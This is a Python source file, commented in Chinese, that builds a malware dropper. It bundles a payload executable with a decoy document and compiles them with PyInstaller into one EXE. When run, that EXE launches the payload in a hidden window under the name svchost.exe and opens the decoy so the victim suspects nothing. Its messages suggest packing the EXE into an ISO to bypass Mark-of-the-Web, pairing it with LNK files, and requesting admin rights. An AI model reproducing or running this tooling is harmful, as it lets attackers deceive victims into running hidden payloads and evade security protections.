import os
import sys
import base64
import shutil
import subprocess
import tempfile
from config import OUTPUT_DIR


def generate_stub_script(payload_path, decoy_path, payload_run_name="svchost.exe"):
    """
    生成 stub Python 脚本
    这个脚本被 PyInstaller 编译后就是最终的捆绑 EXE
    """
    with open(payload_path, 'rb') as f:
        payload_b64 = base64.b64encode(f.read()).decode()

    with open(decoy_path, 'rb') as f:
        decoy_b64 = base64.b64encode(f.read()).decode()

    decoy_ext = os.path.splitext(decoy_path)[1]
    decoy_run_name = f"document{decoy_ext}"

    stub = f'''import os
import sys
import base64
import subprocess
import tempfile
import threading

def main():
    temp_dir = tempfile.mkdtemp()

    # 释放 payload
    payload_data = base64.b64decode("{payload_b64}")
    payload_path = os.path.join(temp_dir, "{payload_run_name}")
    with open(payload_path, "wb") as f:
        f.write(payload_data)

    # 释放诱饵文档
    decoy_data = base64.b64decode("{decoy_b64}")
    decoy_path = os.path.join(temp_dir, "{decoy_run_name}")
    with open(decoy_path, "wb") as f:
        f.write(decoy_data)

    # 后台启动 payload（隐藏窗口）
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE

    try:
        subprocess.Popen(
            [payload_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass

    # 前台打开诱饵文档
    try:
        os.startfile(decoy_path)
    except Exception:
        subprocess.Popen(["cmd", "/c", "start", "", decoy_path],
                        startupinfo=startupinfo)

if __name__ == "__main__":
    main()
'''
    return stub


def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                         payload_run_name="svchost.exe", icon_path=None,
                         one_file=True):
    """
    生成捆绑 EXE 文件

    参数:
        payload_path: 原始 payload EXE 路径
        decoy_path: 诱饵文档路径
        output_filename: 输出 EXE 文件名
        payload_run_name: payload 释放后的进程名（伪装）
        icon_path: 可选：EXE 图标文件（.ico）
        one_file: True=单文件模式 False=目录模式

    返回: (success: bool, message: str)
    """
    try:
        if not os.path.exists(payload_path):
            return False, f"Payload 文件不存在: {payload_path}"
        if not os.path.exists(decoy_path):
            return False, f"诱饵文件不存在: {decoy_path}"

        # 检查 PyInstaller 是否可用
        pyinstaller_path = shutil.which('pyinstaller')
        if not pyinstaller_path:
            try:
                result = subprocess.run(
                    [sys.executable, '-m', 'PyInstaller', '--version'],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode != 0:
                    return False, (
                        "未找到 PyInstaller，请先安装：\n"
                        "pip install pyinstaller\n\n"
                        "安装后重新点击生成"
                    )
                pyinstaller_cmd = [sys.executable, '-m', 'PyInstaller']
            except Exception:
                return False, (
                    "未找到 PyInstaller，请先安装：\n"
                    "pip install pyinstaller"
                )
        else:
            pyinstaller_cmd = [pyinstaller_path]

        work_dir = tempfile.mkdtemp(prefix="binder_build_")

        try:
            # 1. 生成 stub 脚本
            stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)
            stub_path = os.path.join(work_dir, "stub.py")
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)

            # 2. 构建 PyInstaller 命令
            output_name = os.path.splitext(output_filename)[0]

            cmd = pyinstaller_cmd + [
                '--noconfirm',
                '--clean',
                '--noconsole',
                '--name', output_name,
                '--distpath', OUTPUT_DIR,
                '--workpath', os.path.join(work_dir, 'build'),
                '--specpath', work_dir,
            ]

            if one_file:
                cmd.append('--onefile')

            if icon_path and os.path.exists(icon_path):
                cmd.extend(['--icon', icon_path])

            cmd.append(stub_path)

            # 3. 执行 PyInstaller
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=120, cwd=work_dir
            )

            # 4. 检查输出
            if one_file:
                expected_output = os.path.join(OUTPUT_DIR, f"{output_name}.exe")
            else:
                expected_output = os.path.join(OUTPUT_DIR, output_name, f"{output_name}.exe")

            if os.path.exists(expected_output):
                file_size = os.path.getsize(expected_output)
                if file_size > 1048576:
                    size_str = f"{file_size / 1048576:.1f} MB"
                else:
                    size_str = f"{file_size / 1024:.1f} KB"

                payload_size = os.path.getsize(payload_path)
                decoy_size = os.path.getsize(decoy_path)

                return True, (
                    f"捆绑 EXE 已生成: {expected_output}\n"
                    f"文件大小: {size_str}\n\n"
                    f"内嵌文件:\n"
                    f"  Payload: {os.path.basename(payload_path)} ({payload_size/1024:.1f} KB)\n"
                    f"    → 释放为: %TEMP%\\xxx\\{payload_run_name}\n"
                    f"  诱饵: {os.path.basename(decoy_path)} ({decoy_size/1024:.1f} KB)\n"
                    f"    → 释放后自动打开\n\n"
                    f"目标双击此 EXE 后:\n"
                    f"1. 后台静默运行 {payload_run_name}（不弹窗）\n"
                    f"2. 前台自动打开 {os.path.basename(decoy_path)}\n"
                    f"3. 目标看到正常文档打开，不会起疑\n\n"
                    f"提示:\n"
                    f"• 可配合 LNK 模块使用\n"
                    f"• 可打包进 ISO 绕过 MOTW"
                )
            else:
                error_msg = result.stderr if result.stderr else result.stdout
                return False, f"PyInstaller 编译失败:\n{error_msg[-500:]}"

        finally:
            try:
                shutil.rmtree(work_dir, ignore_errors=True)
            except Exception:
                pass

    except subprocess.TimeoutExpired:
        return False, "PyInstaller 编译超时（120秒），请检查文件大小"
    except Exception as e:
        return False, f"生成捆绑 EXE 失败: {str(e)}"


def generate_stub_only(payload_path, decoy_path, output_filename="stub.py",
                        payload_run_name="svchost.exe"):
    """
    仅生成 stub Python 脚本（不编译为 EXE）
    用户可自行用 PyInstaller 编译
    """
    try:
        if not os.path.exists(payload_path):
            return False, f"Payload 文件不存在: {payload_path}"
        if not os.path.exists(decoy_path):
            return False, f"诱饵文件不存在: {decoy_path}"

        stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)

        output_path = os.path.join(OUTPUT_DIR, output_filename)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(stub_code)

        return True, (
            f"Stub 脚本已生成: {output_path}\n\n"
            f"手动编译命令:\n"
            f"pyinstaller --onefile --noconsole --name output {output_path}\n\n"
            f"可选参数:\n"
            f"  --icon app.ico    添加自定义图标\n"
            f"  --uac-admin       请求管理员权限\n"
            f"  --key YOUR_KEY    加密 Python 字节码\n\n"
            f"编译完成后 EXE 在 dist/ 目录中"
        )
    except Exception as e:
        return False, f"生成 Stub 脚本失败: {str(e)}"
